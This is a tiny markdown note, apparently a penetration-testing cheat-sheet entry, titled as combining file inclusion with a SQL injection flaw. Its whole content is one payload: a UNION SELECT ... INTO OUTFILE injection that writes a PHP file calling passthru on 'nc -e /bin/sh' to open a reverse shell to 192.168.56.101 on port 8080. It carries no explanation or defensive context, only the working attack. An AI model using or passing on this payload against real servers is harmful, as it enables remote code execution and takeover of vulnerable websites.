#FileInclusion+SQLvuln

##Using passthru in php websites

```union select '<?passthru("nc -e /bin/sh 192.168.56.101 8080");?>',null into outfile '/tmp/reverse.php'```
